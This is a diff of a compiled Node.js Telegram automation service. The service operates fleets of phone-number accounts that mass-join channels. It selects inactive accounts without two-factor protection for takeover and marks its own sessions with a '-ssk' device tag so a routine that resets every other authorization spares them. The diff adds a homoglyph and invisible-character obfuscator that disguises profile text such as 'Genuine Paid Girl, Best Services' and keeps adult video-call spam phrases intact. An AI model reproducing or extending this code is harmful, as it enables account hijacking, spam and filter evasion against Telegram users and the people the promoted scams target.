@@ -2717,7 +2717,6 @@ let TelegramService = class TelegramService {
     async onModuleDestroy() {
         this.logger.logOperation('system', 'Module destroy initiated');
         clearInterval(this.cleanupInterval);
-        await connection_manager_1.connectionManager.disconnectAll();
     }
     getActiveClientSetup() {
         return TelegramManager_1.default.getActiveClientSetup();
@@ -3994,14 +3993,23 @@ class TelegramManager {
             { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }
         ];
         return authCriteria.some(criterion => {
-            if ('values' in criterion) {
-                return criterion.values.some(value => auth[criterion.field].toLowerCase().includes(value.toLowerCase()));
+            const fieldValue = auth[criterion.field]?.toLowerCase?.() || '';
+            if (criterion.field === 'deviceModel' && fieldValue.endsWith('ssk')) {
+                return true;
             }
-            return auth[criterion.field].toLowerCase().includes(criterion.value.toLowerCase());
+            if ('values' in criterion) {
+                return criterion.values.some(value => fieldValue.includes(value.toLowerCase()));
+            }
+            return fieldValue.includes(criterion.value.toLowerCase());
         });
     }
     async resetAuthorization(auth) {
-        await this.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
+        try {
+            await this.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
+        }
+        catch (error) {
+            (0, parseError_1.parseError)(error, `Failed to reset authorization for ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
+        }
     }
     async getAuths() {
         if (!this.client)
@@ -8702,7 +8710,7 @@ function generateTGConfig() {
         maxConcurrentDownloads: 3,
         downloadRetries: 10,
         floodSleepThreshold: 180,
-        deviceModel: pickRandom(deviceModels),
+        deviceModel: `${pickRandom(deviceModels)}-ssk`,
         systemVersion: pickRandom(systemVersions),
         appVersion: pickRandom(appVersions),
         useIPV6: true,
@@ -10711,7 +10719,6 @@ let ArchivedClientService = ArchivedClientService_1 = class ArchivedClientServic
     }
     async checkArchivedClients() {
         console.log('Starting archived clients check...');
-        await connection_manager_1.connectionManager.disconnectAll();
         await (0, Helpers_1.sleep)(2000);
         const archivedClients = await this.findAll();
         const clients = await this.clientService.findAll();
@@ -11684,6 +11691,12 @@ let BufferClientController = class BufferClientController {
     async search(query) {
         return this.clientService.search(query);
     }
+    async updateInfo() {
+        this.clientService.updateInfo().catch(error => {
+            console.error('Error in checkPromoteClients:', error);
+        });
+        return "initiated Checking";
+    }
     async joinChannelsforBufferClients() {
         return this.clientService.joinchannelForBufferClients();
     }
@@ -11739,6 +11752,13 @@ __decorate([
     __metadata("design:paramtypes", [search_buffer__client_dto_1.SearchBufferClientDto]),
     __metadata("design:returntype", Promise)
 ], BufferClientController.prototype, "search", null);
+__decorate([
+    (0, common_1.Get)('updateInfo'),
+    (0, swagger_1.ApiOperation)({ summary: 'Update promote Clients Info' }),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", []),
+    __metadata("design:returntype", Promise)
+], BufferClientController.prototype, "updateInfo", null);
 __decorate([
     (0, common_1.Get)('joinChannelsForBufferClients'),
     (0, swagger_1.ApiOperation)({ summary: 'Join Channels for BufferClients' }),
@@ -11943,7 +11963,6 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
         this.logger.log('Cleaning up BufferClientService resources');
         this.clearBufferMap();
         this.clearLeaveMap();
-        await connection_manager_1.connectionManager.disconnectAll();
     }
     async create(bufferClient) {
         const newUser = new this.bufferClientModel({
@@ -12036,18 +12055,49 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
         this.joinChannelMap.clear();
         this.clearJoinChannelInterval();
     }
+    async updateStatus(mobile, status, message) {
+        const updateData = { status };
+        if (message) {
+            updateData.message = message;
+        }
+        return this.update(mobile, updateData);
+    }
+    async markAsInactive(mobile, reason) {
+        return this.updateStatus(mobile, 'inactive', reason);
+    }
+    async updateInfo() {
+        const clients = await this.bufferClientModel.find({
+            status: 'active'
+        }).sort({ channels: 1 });
+        for (const client of clients) {
+            const mobile = client.mobile;
+            try {
+                this.logger.debug(`Updating info for client: ${mobile}`);
+                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
+                const channels = await telegramClient.channelInfo(true);
+                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
+                await this.update(mobile, { channels: channels.ids.length });
+                await connection_manager_1.connectionManager.unregisterClient(mobile);
+                await (0, Helpers_1.sleep)(2000);
+            }
+            catch (error) {
+                const errorDetails = (0, parseError_1.parseError)(error);
+                await this.markAsInactive(mobile, `${errorDetails.message}`);
+                this.logger.error(`Error updating info for client ${client.mobile}:`, errorDetails);
+            }
+        }
+    }
     async joinchannelForBufferClients(skipExisting = true) {
         if (this.telegramService.getActiveClientSetup()) {
             this.logger.warn('Ignored active check buffer channels as active client setup exists');
             return 'Active client setup exists, skipping buffer promotion';
         }
         this.logger.log('Starting join channel process for buffer clients');
-        await connection_manager_1.connectionManager.disconnectAll();
-        await (0, Helpers_1.sleep)(2000);
-        this.clearJoinChannelInterval();
-        this.clearLeaveChannelInterval();
         this.joinChannelMap.clear();
         this.leaveChannelMap.clear();
+        this.clearJoinChannelInterval();
+        this.clearLeaveChannelInterval();
+        await (0, Helpers_1.sleep)(2000);
         const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
         const clients = await this.bufferClientModel.find({
             channels: { $lt: 350 },
@@ -12174,7 +12224,6 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                         const client = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                         this.logger.debug(`${mobile} attempting to join channel: @${currentChannel.username}`);
                         await this.telegramService.tryJoiningChannel(mobile, currentChannel);
-                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                     }
                     catch (error) {
                         const errorDetails = (0, parseError_1.parseError)(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Outer Err ERR: `, false);
@@ -12194,12 +12243,9 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                             this.removeFromBufferMap(mobile);
                             await this.remove(mobile);
                         }
-                        try {
-                            await connection_manager_1.connectionManager.unregisterClient(mobile);
-                        }
-                        catch (unregisterError) {
-                            this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
-                        }
+                    }
+                    finally {
+                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                     }
                 }
             }
@@ -12382,7 +12428,6 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
             this.logger.warn("Ignored active check buffer channels as active client setup exists");
             return;
         }
-        await connection_manager_1.connectionManager.disconnectAll();
         await (0, Helpers_1.sleep)(2000);
         const bufferclients = await this.findAll('active');
         const badIds = [];
@@ -12476,7 +12521,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
             expired: false,
             twoFA: false,
             lastActive: { $lt: sixMonthsAgo },
-            totalChats: { $gt: 250 }
+            totalChats: { $gt: 150 }
         }, { tgId: 1 }, badIds.length + 3);
         this.logger.debug(`New buffer documents to be added: ${documents.length}`);
         while (badIds.length > 0 && documents.length > 0) {
@@ -12520,7 +12565,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                         badIds.pop();
                     }
                     else {
-                        this.logger.warn("Failed to Update as BufferClient has Password");
+                        this.logger.debug(`Failed to Update as BufferClient as ${document.mobile} already has Password`);
                         await this.usersService.update(document.tgId, { twoFA: true });
                     }
                 }
@@ -14264,6 +14309,7 @@ const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connectio
 const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
 const ip_management_service_1 = __webpack_require__(/*! ../ip-management/ip-management.service */ "./src/components/ip-management/ip-management.service.ts");
 const promote_client_schema_1 = __webpack_require__(/*! ../promote-clients/schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
+const obfuscateText_1 = __webpack_require__(/*! ../../utils/obfuscateText */ "./src/utils/obfuscateText.ts");
 let settingupClient = Date.now() - 250000;
 let ClientService = ClientService_1 = class ClientService {
     constructor(clientModel, promoteClientModel, telegramService, bufferClientService, usersService, archivedClientService, sessionService, ipManagementService, npointSerive) {
@@ -14555,7 +14601,6 @@ let ClientService = ClientService_1 = class ClientService {
             console.log("Updating Client Session");
             const setup = this.telegramService.getActiveClientSetup();
             const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;
-            await connection_manager_1.connectionManager.disconnectAll();
             await (0, Helpers_1.sleep)(2000);
             const client = await this.findOne(clientId);
             await connection_manager_1.connectionManager.getClient(newMobile, { handler: true, autoDisconnect: false });
@@ -14636,7 +14681,6 @@ let ClientService = ClientService_1 = class ClientService {
             this.telegramService.setActiveClientSetup(undefined);
             console.log("Update finished Exitting Exiiting TG Service");
             await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Update finished`);
-            await connection_manager_1.connectionManager.disconnectAll();
         }
         catch (e) {
             (0, parseError_1.parseError)(e, 'Error in updating client session', true);
@@ -14673,7 +14717,7 @@ let ClientService = ClientService_1 = class ClientService {
             }
             await (0, Helpers_1.sleep)(1000);
             if (me.firstName !== client.name) {
-                await telegramClient.updateProfile(client.name, "Genuine Paid Girl🥰, Best Services❤️");
+                await telegramClient.updateProfile((0, obfuscateText_1.obfuscateText)(client.name), `${(0, obfuscateText_1.obfuscateText)("Genuine Paid Girl")}🥰, ${(0, obfuscateText_1.obfuscateText)("Best Services")}❤️`);
             }
             await (0, Helpers_1.sleep)(1000);
             await telegramClient.deleteProfilePhotos();
@@ -18577,6 +18621,12 @@ let PromoteClientController = class PromoteClientController {
     async joinChannelsforPromoteClients() {
         return this.clientService.joinchannelForPromoteClients();
     }
+    async updateInfo() {
+        this.clientService.updateInfo().catch(error => {
+            console.error('Error in checkPromoteClients:', error);
+        });
+        return "initiated Checking";
+    }
     async checkpromoteClients() {
         this.clientService.checkPromoteClients().catch(error => {
             console.error('Error in checkPromoteClients:', error);
@@ -18686,6 +18736,13 @@ __decorate([
     __metadata("design:paramtypes", []),
     __metadata("design:returntype", Promise)
 ], PromoteClientController.prototype, "joinChannelsforPromoteClients", null);
+__decorate([
+    (0, common_1.Get)('updateInfo'),
+    (0, swagger_1.ApiOperation)({ summary: 'Update promote Clients Info' }),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", []),
+    __metadata("design:returntype", Promise)
+], PromoteClientController.prototype, "updateInfo", null);
 __decorate([
     (0, common_1.Get)('checkPromoteClients'),
     (0, swagger_1.ApiOperation)({ summary: 'Check Promote Clients' }),
@@ -19038,6 +19095,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
         this.LEAVE_CHANNEL_INTERVAL = 60 * 1000;
         this.LEAVE_CHANNEL_BATCH_SIZE = 10;
         this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER = 10;
+        this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT = 16;
     }
     async create(promoteClient) {
         const promoteClientData = {
@@ -19156,19 +19214,40 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
         this.joinChannelMap.clear();
         this.clearJoinChannelInterval();
     }
+    async updateInfo() {
+        const clients = await this.promoteClientModel.find({
+            status: 'active'
+        }).sort({ channels: 1 });
+        for (const client of clients) {
+            const mobile = client.mobile;
+            try {
+                this.logger.debug(`Updating info for client: ${mobile}`);
+                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
+                const channels = await telegramClient.channelInfo(true);
+                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
+                await this.update(mobile, { channels: channels.ids.length });
+                await connection_manager_1.connectionManager.unregisterClient(mobile);
+                await (0, Helpers_1.sleep)(2000);
+            }
+            catch (error) {
+                const errorDetails = (0, parseError_1.parseError)(error);
+                await this.markAsInactive(mobile, `${errorDetails.message}`);
+                this.logger.error(`Error updating info for client ${client.mobile}:`, errorDetails);
+            }
+        }
+    }
     async joinchannelForPromoteClients(skipExisting = true) {
         if (this.telegramService.getActiveClientSetup()) {
             this.logger.warn('Active client setup exists, skipping promotion process');
             return 'Active client setup exists, skipping promotion';
         }
         this.logger.log('Starting join channel process');
+        this.joinChannelMap.clear();
+        this.leaveChannelMap.clear();
         this.clearJoinChannelInterval();
         this.clearLeaveChannelInterval();
+        await (0, Helpers_1.sleep)(2000);
         try {
-            await connection_manager_1.connectionManager.disconnectAll();
-            await (0, Helpers_1.sleep)(2000);
-            this.joinChannelMap.clear();
-            this.leaveChannelMap.clear();
             const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
             const clients = await this.promoteClientModel.find({
                 channels: { $lt: 350 },
@@ -19313,11 +19392,11 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
                         await this.telegramService.tryJoiningChannel(mobile, currentChannel);
                     }
                     catch (error) {
-                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} @${currentChannel?.username || 'unknown'} Outer Err ERR: `, false);
-                        this.logger.error(`${mobile}: Error joining @${currentChannel?.username || 'unknown'}:`, errorDetails);
+                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Outer Err ERR: `, false);
+                        this.logger.error(`Error joining channel for ${mobile}: ${error.message}`);
                         const errorMsg = error.errorMessage || error.message;
-                        if (errorDetails.error === 'FloodWaitError' || errorMsg === 'CHANNELS_TOO_MUCH') {
-                            this.logger.warn(`${mobile}: FloodWaitError or too many channels, handling...`);
+                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
+                            this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                             this.removeFromPromoteMap(mobile);
                             const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                             await this.update(mobile, { channels: channelsInfo.ids.length });
@@ -19325,8 +19404,10 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
                         if (errorMsg === "SESSION_REVOKED" ||
                             errorMsg === "AUTH_KEY_UNREGISTERED" ||
                             errorMsg === "USER_DEACTIVATED" ||
-                            errorMsg === "USER_DEACTIVATED_BAN") {
-                            this.logger.error(`Session invalid for ${mobile}, marking as inactive and removing client`);
+                            errorMsg === "USER_DEACTIVATED_BAN" ||
+                            errorMsg === "FROZEN_METHOD_INVALID") {
+                            this.logger.error(`Session invalid for ${mobile}, removing client`);
+                            this.removeFromPromoteMap(mobile);
                             try {
                                 await this.markAsInactive(mobile, `Session error: ${errorMsg}`);
                             }
@@ -19546,7 +19627,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
             for (const client of clients) {
                 const assignedCount = promoteClientsPerClient.get(client.clientId) || 0;
                 promoteClientsPerClient.set(client.clientId, assignedCount);
-                const needed = Math.max(0, 12 - assignedCount);
+                const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - assignedCount);
                 if (needed > 0) {
                     clientNeedingPromoteClients.push(client.clientId);
                 }
@@ -19556,7 +19637,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
                 if (totalSlotsNeeded >= this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER)
                     break;
                 const assignedCount = promoteClientsPerClient.get(clientId) || 0;
-                const needed = Math.max(0, 12 - assignedCount);
+                const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - assignedCount);
                 const allocatedForThisClient = Math.min(needed, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER - totalSlotsNeeded);
                 totalSlotsNeeded += allocatedForThisClient;
             }
@@ -19583,14 +19664,14 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
             let needed = 0;
             if (promoteClientsPerClient) {
                 const currentCount = promoteClientsPerClient.get(clientId) || 0;
-                needed = Math.max(0, 12 - currentCount);
+                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
             }
             else {
                 const currentCount = await this.promoteClientModel.countDocuments({
                     clientId,
                     status: 'active'
                 });
-                needed = Math.max(0, 12 - currentCount);
+                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
             }
             totalNeededFromClients += needed;
         }
@@ -19605,7 +19686,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
             expired: false,
             twoFA: false,
             lastActive: { $lt: sixMonthsAgo },
-            totalChats: { $gt: 250 }
+            totalChats: { $gt: 150 }
         }, { tgId: 1 }, totalNeeded + 5);
         this.logger.debug(`New promote documents to be added: ${documents.length} for ${clientsNeedingPromoteClients.length} clients needing promote clients (limited to ${totalNeeded})`);
         let processedCount = 0;
@@ -19614,14 +19695,14 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
             let needed = 0;
             if (promoteClientsPerClient) {
                 const currentCount = promoteClientsPerClient.get(clientId) || 0;
-                needed = Math.max(0, 12 - currentCount);
+                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
             }
             else {
                 const currentCount = await this.promoteClientModel.countDocuments({
                     clientId,
                     status: 'active'
                 });
-                needed = Math.max(0, 12 - currentCount);
+                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
             }
             clientAssignmentTracker.set(clientId, needed);
         }
@@ -19683,7 +19764,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
                         this.logger.log(`=============Created PromoteClient for ${targetClientId}==============`);
                     }
                     else {
-                        this.logger.debug("Failed to Update as PromoteClient has Password");
+                        this.logger.debug(`Failed to Update as PromoteClient as ${document.mobile} already has Password`);
                         try {
                             await this.usersService.update(document.tgId, { twoFA: true });
                         }
@@ -19741,7 +19822,6 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
         this.logger.log('Cleaning up PromoteClientService resources');
         this.clearPromoteMap();
         this.clearLeaveMap();
-        await connection_manager_1.connectionManager.disconnectAll();
     }
     async getPromoteClientDistribution() {
         const clients = await this.clientService.findAll();
@@ -19803,7 +19883,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
             const inactiveCount = inactiveCountMap.get(client.clientId) || 0;
             const neverUsed = neverUsedCountMap.get(client.clientId) || 0;
             const usedInLast24Hours = recentlyUsedCountMap.get(client.clientId) || 0;
-            const needed = Math.max(0, 12 - activeCount);
+            const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - activeCount);
             const status = needed === 0 ? 'sufficient' : 'needs_more';
             distributionPerClient.push({
                 clientId: client.clientId,
@@ -27387,6 +27467,379 @@ function ppplbot(chatId = process.env.updatesChannel || '-1001972065816', botTok
         currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
     }
     return apiUrl;
+}
+
+
+/***/ }),
+
+/***/ "./src/utils/obfuscateText.ts":
+/*!************************************!*\
+  !*** ./src/utils/obfuscateText.ts ***!
+  \************************************/
+/***/ ((__unused_webpack_module, exports) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.invisibleChars = exports.specialCharMap = exports.numberMap = exports.homoglyphMap = exports.SeededRandom = exports.ObfuscationConfig = void 0;
+exports.obfuscateText = obfuscateText;
+exports.analyzeText = analyzeText;
+exports.attemptReverse = attemptReverse;
+exports.batchObfuscate = batchObfuscate;
+exports.generateVariants = generateVariants;
+exports.validateConfig = validateConfig;
+const DEFAULT_CONFIG = {
+    substitutionRate: 0.4,
+    invisibleCharRate: 0,
+    preserveCase: false,
+    preserveNumbers: false,
+    preserveSpecialChars: true,
+    useInvisibleChars: false,
+    maintainFormatting: true,
+    randomSeed: null,
+    maxInvisibleCharsPerWord: 2,
+    customSafeBlocks: [],
+    intensityVariation: false
+};
+const homoglyphMap = {
+    a: ['а', 'ɑ', 'ᴀ', 'α', '⍺'],
+    b: ['Ь', 'ʙ', 'в', 'Ƅ', 'ɓ'],
+    c: ['ϲ', 'ᴄ', 'с', 'ℂ', 'ⅽ'],
+    d: ['ԁ', 'ժ', 'ɗ', 'ᴅ', 'ɖ'],
+    e: ['е', 'ҽ', 'ɛ', 'ɘ'],
+    f: ['ғ', 'ƒ', 'ꝼ', 'ϝ', 'ʄ'],
+    g: ['ɡ', 'ɢ', 'ց', 'ɠ', 'ǥ'],
+    h: ['һ', 'н', 'ḩ'],
+    i: ['і', 'ì', 'í'],
+    j: ['ј', 'ʝ', 'ɉ', 'ĵ', 'ǰ', 'ɟ'],
+    k: ['κ', 'ᴋ', 'қ', 'ƙ', 'ĸ'],
+    l: ['ⅼ', 'ʟ', 'ŀ', 'ɭ'],
+    m: ['м', 'ᴍ', 'ɱ'],
+    n: ['ո', 'п', 'ռ', 'ᴎ', 'ɲ', 'ŋ'],
+    o: ['о', 'օ', 'ᴏ', 'ο'],
+    p: ['р', 'ρ', 'ᴩ', 'ƥ', 'þ', 'ᵽ'],
+    q: ['ԛ', 'գ', 'ɋ', 'ʠ'],
+    r: ['г', 'ᴦ', 'ʀ', 'ɾ', 'ɍ'],
+    s: ['ѕ', 'ꜱ'],
+    t: ['т', 'ᴛ', 'ƭ', 'ʈ'],
+    u: ['υ', 'ᴜ', 'ս', 'ʊ', 'ų'],
+    v: ['ѵ', 'ᴠ', 'ν', 'ʋ', 'ⱱ'],
+    w: ['ԝ', 'ᴡ', 'ω', 'ɯ', 'ɰ'],
+    x: ['х', 'χ',],
+    y: ['у', 'γ', 'ү', 'ყ', 'ỵ'],
+    z: ['ᴢ', 'ʐ', 'ʑ', 'ʒ']
+};
+exports.homoglyphMap = homoglyphMap;
+const numberMap = {
+    '0': ['О', '𝟎', '𝟘', '𝟢', '𝟬', '𝟶'],
+    '1': ['𝟏', '𝟙', '𝟣', '𝟭', '𝟷'],
+    '2': ['𝟐', '𝟚', '𝟤', '𝟮', '𝟸'],
+    '3': ['Ʒ', '𝟑', '𝟛', '𝟥', '𝟯', '𝟹', 'З'],
+    '4': ['Ꮞ', '𝟒', '𝟜', '𝟦', '𝟰', '𝟺'],
+    '5': ['Ƽ', '𝟓', '𝟝', '𝟧', '𝟱', '𝟻'],
+    '6': ['б', '𝟔', '𝟞', '𝟨', '𝟲', '𝟼'],
+    '7': ['７', '𝟕', '𝟟', '𝟩', '𝟳', '𝟽'],
+    '8': ['𝟖', '𝟠', '𝟪', '𝟴', '𝟾'],
+    '9': ['𝟗', '𝟡', '𝟫', '𝟵', '𝟿']
+};
+exports.numberMap = numberMap;
+const specialCharMap = {
+    ' ': ['\u2000', '\u2001', '\u2002', '\u2003', '\u2004', '\u2005', '\u2006', '\u2007', '\u2008', '\u2009', '\u200A', '\u00A0'],
+    '.': ['․', '‧', '・', '⋅', '∘', '◦'],
+    ',': ['‚', '،', '、', '︐'],
+    '!': ['！', '❗', '❕', '¡'],
+    '?': ['？', '❓', '❔', '¿'],
+    ':': ['：', '︓', '⁚', '˸'],
+    ';': ['；', '︔'],
+    '-': ['‐', '‑', '‒', '–', '—', '―', '⸗', '−'],
+    '(': ['❨', '❪', '⁽', '₍'],
+    ')': ['❩', '❫', '⁾', '₎'],
+    '[': ['❲', '［', '⁅'],
+    ']': ['❳', '］', '⁆'],
+    '{': ['❴', '｛'],
+    '}': ['❵', '｝'],
+    '"': ['"', '"', '‟', '❝', '❞'],
+    "'": ['‛', '❛', '❜']
+};
+exports.specialCharMap = specialCharMap;
+const invisibleChars = [
+    '\u200B',
+    '\u200C',
+    '\u200D',
+    '\u2060',
+    '\uFEFF',
+];
+exports.invisibleChars = invisibleChars;
+class ObfuscationConfig {
+    constructor(options = {}) {
+        const config = { ...DEFAULT_CONFIG, ...options };
+        this.substitutionRate = config.substitutionRate;
+        this.invisibleCharRate = config.invisibleCharRate;
+        this.preserveCase = config.preserveCase;
+        this.preserveNumbers = config.preserveNumbers;
+        this.preserveSpecialChars = config.preserveSpecialChars;
+        this.useInvisibleChars = config.useInvisibleChars;
+        this.maintainFormatting = config.maintainFormatting;
+        this.randomSeed = config.randomSeed;
+        this.maxInvisibleCharsPerWord = config.maxInvisibleCharsPerWord;
+        this.customSafeBlocks = Object.freeze([...config.customSafeBlocks]);
+        this.intensityVariation = config.intensityVariation;
+    }
+    toJSON() {
+        return {
+            substitutionRate: this.substitutionRate,
+            invisibleCharRate: this.invisibleCharRate,
+            preserveCase: this.preserveCase,
+            preserveNumbers: this.preserveNumbers,
+            preserveSpecialChars: this.preserveSpecialChars,
+            useInvisibleChars: this.useInvisibleChars,
+            maintainFormatting: this.maintainFormatting,
+            randomSeed: this.randomSeed,
+            maxInvisibleCharsPerWord: this.maxInvisibleCharsPerWord,
+            customSafeBlocks: [...this.customSafeBlocks],
+            intensityVariation: this.intensityVariation
+        };
+    }
+}
+exports.ObfuscationConfig = ObfuscationConfig;
+class SeededRandom {
+    constructor(seed = null) {
+        this.seed = seed ?? Math.random() * 2147483647;
+        this.current = this.seed;
+    }
+    next() {
+        this.current = (this.current * 16807) % 2147483647;
+        return this.current / 2147483647;
+    }
+    choice(array) {
+        if (array.length === 0) {
+            throw new Error('Cannot choose from empty array');
+        }
+        return array[Math.floor(this.next() * array.length)];
+    }
+    chance(probability) {
+        return this.next() < probability;
+    }
+    getSeed() {
+        return this.seed;
+    }
+    reset() {
+        this.current = this.seed;
+    }
+}
+exports.SeededRandom = SeededRandom;
+function getRandom(arr, weights) {
+    if (arr.length === 0) {
+        throw new Error('Cannot select from empty array');
+    }
+    if (!weights) {
+        return arr[Math.floor(Math.random() * arr.length)];
+    }
+    if (weights.length !== arr.length) {
+        throw new Error('Weights array must have same length as choices array');
+    }
+    const totalWeight = weights.reduce((sum, weight) => sum + weight, 0);
+    if (totalWeight <= 0) {
+        throw new Error('Total weight must be positive');
+    }
+    let random = Math.random() * totalWeight;
+    for (let i = 0; i < arr.length; i++) {
+        if (random < weights[i]) {
+            return arr[i];
+        }
+        random -= weights[i];
+    }
+    return arr[arr.length - 1];
+}
+const defaultSafeBlocks = [
+    '𝗩𝗲𝗱𝗶𝗼 𝗖𝗮𝗹𝗹 𝗗𝗲𝗺𝗼 𝗔𝘃𝗶𝗹𝗯𝗹𝗲',
+    '━━━━━━━━━━━━━━━━━━━━━━━━',
+    '🔥🔥  T O D A Y \' S   O F F E R  🔥🔥',
+    '🇻 🇮 🇩 🇪 🇴  🇨 🇦 𝗟 𝗟 ',
+    '𝗠𝗢𝗢𝗗', '𝗨𝗡𝗗𝗜', '𝗜𝗗𝗘', '𝗜𝗥𝗨𝗞𝗞𝗨',
+    '𝗛𝗔𝗜', '𝗛𝗔𝗜𝗥', '𝗛𝗔𝗜𝗥𝗘', '𝗗𝗠', '𝗖𝗛𝗘𝗬𝗬𝗜',
+    '𝗕𝗢𝗬𝗦', '𝗚𝗔𝗥𝗔𝗠', '𝗛𝗨𝗠𝗔𝗜𝗥𝗔𝗠', '𝗛𝗔𝗜𝗥𝗘𝗦𝗦', '𝗔𝗥𝗘𝗔𝗦',
+    '𝗖𝗔𝗟𝗟', '𝗡𝗢𝗪', '𝗗𝗔𝗥𝗟𝗜𝗡𝗚',
+    '𝗝𝗢𝗜𝗡', '𝗙𝗔𝗦𝗧', '𝗧𝗜𝗠𝗘', '𝗡𝗢', '𝗛𝗔𝗜',
+    '𝗟𝗘𝗧𝗦', '𝗛𝗔𝗩𝗘', '𝗛𝗢𝗧', '𝗩𝗜𝗗𝗘𝗢', '𝗖𝗔𝗟𝗟'
+];
+function obfuscateText(text, config = {}) {
+    const settings = config instanceof ObfuscationConfig ? config : new ObfuscationConfig(config);
+    const random = new SeededRandom(settings.randomSeed);
+    const safeBlocks = [...defaultSafeBlocks, ...settings.customSafeBlocks];
+    const specialCharCache = new Map();
+    let obfuscated = '';
+    const lines = text.split('\n');
+    for (let j = 0; j < lines.length; j++) {
+        const line = lines[j].replace(/\*\*/g, '');
+        if (line.trim() === '') {
+            obfuscated += '\n';
+            continue;
+        }
+        const isSafe = safeBlocks.some((safe) => line.includes(safe));
+        if (isSafe) {
+            obfuscated += line + '\n';
+            continue;
+        }
+        let newLine = '';
+        let invisibleCharsInWord = 0;
+        let isInWord = false;
+        let currentSubstitutionRate = settings.substitutionRate;
+        if (settings.intensityVariation) {
+            const variation = (random.next() - 0.5) * 0.3;
+            currentSubstitutionRate = Math.max(0.1, Math.min(0.9, currentSubstitutionRate + variation));
+        }
+        for (let i = 0; i < line.length; i++) {
+            const c = line[i];
+            const lower = c.toLowerCase();
+            const isLetter = /[a-zA-Z]/.test(c);
+            const isNumber = /[0-9]/.test(c);
+            const isSpace = /\s/.test(c);
+            if (isLetter || isNumber) {
+                if (!isInWord) {
+                    isInWord = true;
+                    invisibleCharsInWord = 0;
+                }
+            }
+            else if (isSpace) {
+                isInWord = false;
+                invisibleCharsInWord = 0;
+            }
+            let substituted = false;
+            if (isLetter && homoglyphMap[lower] && random.chance(currentSubstitutionRate)) {
+                const substitute = random.choice(homoglyphMap[lower]);
+                newLine += settings.preserveCase && c === c.toUpperCase() ? substitute.toUpperCase() : substitute;
+                substituted = true;
+            }
+            else if (isNumber && !settings.preserveNumbers && numberMap[c] && random.chance(currentSubstitutionRate)) {
+                newLine += random.choice(numberMap[c]);
+                substituted = true;
+            }
+            else if (!isLetter && !isNumber && !isSpace && !settings.preserveSpecialChars &&
+                specialCharMap[c] && random.chance(currentSubstitutionRate * 0.3)) {
+                if (specialCharCache.has(c)) {
+                    newLine += specialCharCache.get(c);
+                }
+                else {
+                    const sub = random.choice(specialCharMap[c]);
+                    specialCharCache.set(c, sub);
+                    newLine += sub;
+                }
+                substituted = true;
+            }
+            else {
+                newLine += c;
+            }
+            if (settings.useInvisibleChars && isInWord && i > 0 &&
+                invisibleCharsInWord < settings.maxInvisibleCharsPerWord &&
+                (isLetter || isNumber) && random.chance(settings.invisibleCharRate)) {
